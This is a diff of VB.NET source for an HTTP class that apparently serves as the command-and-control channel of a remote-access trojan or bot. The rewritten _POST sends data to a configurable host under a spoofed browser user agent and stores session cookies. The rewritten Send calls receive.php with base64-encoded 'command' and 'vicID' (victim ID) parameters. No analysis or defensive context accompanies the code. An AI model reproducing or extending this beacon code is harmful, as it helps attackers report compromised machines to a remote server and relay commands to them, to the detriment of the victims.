@@ -1,11 +1,15 @@
 ﻿Imports System.Net
 Imports System.Text
+Imports System.IO
+
 Namespace HTTPSocket
     Public Class HTTP
         Public Host As String
         Public Data As String
         Public Y As String = "|BN|"
         Public ID As String
+        Dim logincookie As CookieContainer
+
 
         Public Function Connect()
             Try
@@ -24,7 +28,7 @@ Namespace HTTPSocket
             output = output.Replace("/", "_")
             ENB = output
         End Function
-    
+
         Public Function DEB(ByRef s As String) As String
             Dim output = s
             output = output.Replace("-", "+")
@@ -49,34 +53,41 @@ Namespace HTTPSocket
                 Return ex.Message
             End Try
         End Function
-    
-        Public Function _POST(ByVal filename As String, ByVal requst As String)
-            Try
-                Dim s As HttpWebRequest
-                Dim enc As UTF8Encoding
-                Dim postdata As String
-                Dim postdatabytes As Byte()
-                s = HttpWebRequest.Create(Host & "/" & filename)
-                enc = New UTF8Encoding()
-                postdata = requst
-                postdatabytes = enc.GetBytes(postdata)
-                s.Method = "POST"
-                s.ContentType = "application/x-www-form-urlencoded"
-                s.ContentLength = postdatabytes.Length
 
-                Using stream = s.GetRequestStream()
-                    stream.Write(postdatabytes, 0, postdatabytes.Length)
-                End Using
-                Dim result = s.GetResponse()
-                Return result
-            Catch ex As WebException
-                Return ex.Message
-            End Try
+        Public Function _POST(ByVal filename As String, ByVal requstData As String)
+            Dim postData As String = requstData
+            Dim tempCookies As New CookieContainer
+            Dim encoding As New UTF8Encoding
+            Dim byteData As Byte() = encoding.GetBytes(postData)
+
+            Dim postReq As HttpWebRequest = DirectCast(WebRequest.Create(Host & "/" & filename), HttpWebRequest)
+            postReq.Method = "POST"
+            postReq.KeepAlive = True
+            postReq.CookieContainer = tempCookies
+            postReq.ContentType = "application/x-www-form-urlencoded"
+            postReq.UserAgent = "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)"
+            postReq.ContentLength = byteData.Length
+
+            Dim postreqstream As Stream = postReq.GetRequestStream()
+            postreqstream.Write(byteData, 0, byteData.Length)
+            postreqstream.Close()
+            Dim postresponse As HttpWebResponse
+
+            postresponse = DirectCast(postReq.GetResponse(), HttpWebResponse)
+            tempCookies.Add(postresponse.Cookies)
+            logincookie = tempCookies
+            Dim postreqreader As New StreamReader(postresponse.GetResponseStream())
+
+            Dim thepage As String = postreqreader.ReadToEnd
+            Return thepage
         End Function
 
         Public Function Send(ByVal Command As String)
             Try
-                _GET(Host & "/" & "receive.php?command=" & ENB(Command) & "&vicID=" & ENB(ID))
+                Dim Socket As New WebClient
+
+                Socket.DownloadString(Host & "/" & "receive.php?command=" & ENB(Command) & "&vicID=" & ENB(ID))
+
                 Return True
             Catch ex As WebException
                 Return ex.Message
